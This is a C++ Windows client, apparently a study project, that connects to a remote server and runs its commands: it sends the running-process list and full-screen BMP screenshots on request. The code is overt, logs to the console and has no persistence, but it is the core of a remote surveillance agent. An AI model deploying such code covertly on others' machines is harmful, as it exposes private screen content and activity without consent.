#include <winsock2.h>   // WinAPI sockets
#include <ws2tcpip.h>   // Types references
#include <TlHelp32.h>   // Types references
#include <iostream>
#include <string>
#include <vector>
#include <cstdint>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")


class Client {
// Client class
private:
    // Struct for Process information
    struct ProcInfo {
        std::string Name;
        DWORD pid;
    };

    SOCKET sock;
    std::string server_ip;
    int server_port;
    int ElapsingTime; // Waing message from Server period
    bool connected;
    
    bool initialize_winsock() {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
            return false;
        }
        return true;
    }
    
    void cleanup_winsock() {
        WSACleanup();
    }

    // Run through system and get all running process
    std::vector<ProcInfo> getRunningProcesses() {
        std::vector<ProcInfo> result;
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return result;

        PROCESSENTRY32W pe32; // PROCESSENTRY32W (Unicode)
        pe32.dwSize = sizeof(pe32);
        
        if (Process32FirstW(hSnap, &pe32)) {
            do {
                // WCHAR to UTF-8 string
                char exeName[MAX_PATH];
                WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, exeName, MAX_PATH, NULL, NULL);
                result.push_back({exeName, pe32.th32ProcessID});
            } while (Process32NextW(hSnap, &pe32));
        }
        
        CloseHandle(hSnap);
        return result;
    }
    
    // Builds JSON-like std::string from list of process
    std::string buildJSONprocs(const std::vector<ProcInfo>& list) {
        std::string result = "{ \"processes\": [";
        
        for (size_t i = 0; i < list.size(); ++i) {
            result += "{ \"exe\": \"" + list[i].Name + "\", \"pid\": " + std::to_string(list[i].pid) + " }";
            if (i != list.size() - 1) {
                result += ", ";
            }
        }
        
        result += "] }\n";
        return result;
    }


public:
    // Create client with Elapsing Time (socket waiting Time Out) = 30s default
    Client(const std::string& ip, int port, DWORD ElapsingTime = 3000) : sock(INVALID_SOCKET), server_ip(ip), server_port(port), connected(false), ElapsingTime(ElapsingTime) {
        initialize_winsock();
    }
    
    ~Client() {
        disconnect();
        cleanup_winsock();
    }
    
    // No copy
    Client(const Client&) = delete;
    Client& operator=(const Client&) = delete;
    
    // Connect to server
    bool connect_to_server() {
        // Creating socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
            return false;
        }
        
        // Setting response waiting time and connecting to server
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&ElapsingTime, sizeof(ElapsingTime));
        sockaddr_in server_addr = {};
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr);
        
        std::cout << "Connecting to " << server_ip << ":" << server_port << "..." << std::endl;
        
        if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
            std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            sock = INVALID_SOCKET;
            return false;
        }
        
        connected = true;
        std::cout << "Connected!" << std::endl;
        return true;
    }
    
    // Sending message to server
    bool send_message(const std::string& message) {
        if (!connected) return false;
        
        int sent = send(sock, message.c_str(), message.length(), 0);
        if (sent == SOCKET_ERROR) {
            std::cerr << "Sending failed: " << WSAGetLastError() << std::endl;
            return false;
        }
        
        std::cout << "Sent " << sent << " bytes" << std::endl;
        return true;
    }
    
    // Sending Statistics about running process
    bool sendProcessStatistics() {
        if (!connected) return false;
        // Get all process
        std::vector<ProcInfo> procs = getRunningProcesses();

        // Combining JSON like message
        std::string message = buildJSONprocs(procs);
        std::string message_info = "ProcessJSON, " + std::to_string(message.length()) + "\n";

        // Send to server
        if (!send_message(message_info) || !send_message(message)) {
            std::cout << "Statistics was not sent to server" << std::endl;
            return false;
        }
        std::cout << "Statistics was sent to server" << std::endl;
        return true;
    }

    // Receiving messages from server with ElapsingTime
    bool receive_message(std::string& response, int& elapsed_ms) {
        if (!connected) return false;
        
        char buffer[4096];
        int received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (received == SOCKET_ERROR) {
            // Validate socket waiting Time Out (ElapsingTime)
            int err = WSAGetLastError();
            if (err == WSAETIMEDOUT) {
                // Not getting messages from server over ElapsingTime
                elapsed_ms += int(ElapsingTime);
                return true;
            }
            std::cerr << "Receive failed: " << err << std::endl;
            connected = false;
            return false;
        }
        if (received == 0) {
            std::cout << "Connection closed by server" << std::endl;
            connected = false;
            return false;
        }
        buffer[received] = '\0';
        response.assign(buffer);
        // Zero waiting time
        elapsed_ms = 0;
        return true;
    }

    // Sending Screenshot to server
    bool sendScreenshot() {
        // Capturing screen
        int screenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int screenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

        HDC hScreenDC = GetDC(NULL);
        HDC hMemDC = CreateCompatibleDC(hScreenDC);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
        SelectObject(hMemDC, hBitmap);
        
        if (!BitBlt(hMemDC, 0, 0, width, height, hScreenDC, screenX, screenY, SRCCOPY|CAPTUREBLT)) {
            DeleteObject(hBitmap);
            DeleteDC(hMemDC);
            ReleaseDC(NULL, hScreenDC);
            return false;
        }

        // BMP-headers
        BITMAP bmp;
        GetObjectW(hBitmap, sizeof(bmp), &bmp);
        BITMAPINFOHEADER bih = {};
        bih.biSize = sizeof(bih);
        bih.biWidth = bmp.bmWidth;
        bih.biHeight = bmp.bmHeight;
        bih.biPlanes = 1;
        bih.biBitCount = 32;
        bih.biCompression = BI_RGB;

        int rowBytes = ((bmp.bmWidth * 32 + 31) / 32) * 4;
        DWORD pixelDataSize = rowBytes * bmp.bmHeight;

        BITMAPFILEHEADER bfh = {};
        bfh.bfType = 0x4D42;  // 'BM'
        bfh.bfOffBits = sizeof(bfh) + sizeof(bih);
        bfh.bfSize = bfh.bfOffBits + pixelDataSize;

        // 3) Читаем пиксели
        std::vector <uint8_t> buffer(bfh.bfSize);
        // Копируем заголовки
        memcpy(buffer.data(), &bfh, sizeof(bfh));
        memcpy(buffer.data() + sizeof(bfh), &bih, sizeof(bih));

        // Получаем пиксели
        if (!GetDIBits(hMemDC, hBitmap, 0, bmp.bmHeight, buffer.data() + bfh.bfOffBits, (BITMAPINFO*)&bih, DIB_RGB_COLORS)) {
            DeleteObject(hBitmap);
            DeleteDC(hMemDC);
            ReleaseDC(NULL, hScreenDC);
            return false;
        }

        // Release GDI
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreenDC);

        std::string screen_data = std::string(reinterpret_cast<const char *>(buffer.data()), buffer.size());
        std::string screen_data_info = "ScreenShot BMP, " + std::to_string(screen_data.length()) + "\n"; // Operation Header
        
        if (!send_message(screen_data_info) || !send_message(screen_data)) {
            std::cout << "Screenshoot was NOT sent to server!" << std::endl;
            return false;
        }

        std::cout << "Screenshoot was sent to server!" << std::endl;
        return true;
    }
    
    // Compatiable commands from server
    void ValidateCommand(const std::string& command) {
        std::string ProcessStatCommand = "SEND_STAT";
        std::string DeauthCommand = "DEAUTH_REQUEST";
        std::string ScreenShoot = "SEND_SCREEN";

        if (command.find(ProcessStatCommand) != std::string::npos) {
            sendProcessStatistics();
        }
        else if (command.find(DeauthCommand) != std::string::npos) {
            std::cout << "Server DEAUTH REQUEST" << std::endl;
            disconnect();
        }
        else if (command.find(ScreenShoot) != std::string::npos) {
            if (!sendScreenshot()) std::cout << "Can\'t send screenshoot to server!" << std::endl;;
        }
    }

    // Disconnecting
    void disconnect() {
        if (sock != INVALID_SOCKET) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            connected = false;
            std::cout << "Disconnected!" << std::endl;
        }
    }
    
    // Connection check
    bool is_connected() const {
        return connected;
    }

    // Client's sturtup function
    void start() {
        if (!connect_to_server()) return;
        
        int elapsed_ms = 0;
        std::string welcome;
        std::string response;
        receive_message(welcome, elapsed_ms);
        std::cout << welcome << std::endl;

        while (is_connected()){
            if (!receive_message(response, elapsed_ms)) {
                disconnect();
                std::cout << "\nError while getting response from server\n";
                break;
            }

            // If message from server was received
            if (!response.empty()) {
                ValidateCommand(response);
                response.erase();
            }

            // If have been waiting for 10 minutes -- Disconnect
            if (elapsed_ms >= 600000) {  
                std::cout << "\nNot getting responses from server through wiating time. Disconnect...\n";
                disconnect();
                break;
            }
        }
    }
};

int main(int argc, char* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    
    std::vector <std::string> args;
    for (int i = 0; i < argc; ++i) {
        args.emplace_back(argv[i]);
    }

    std::string server_ip = args[1];
    int server_port = std::stoi(args[2]);
    DWORD ElapsingTime = argc == 4 ? std::stoi(args[3]) : 30000;
    Client client(server_ip, server_port, ElapsingTime);
    
    client.start();

    return 0;
}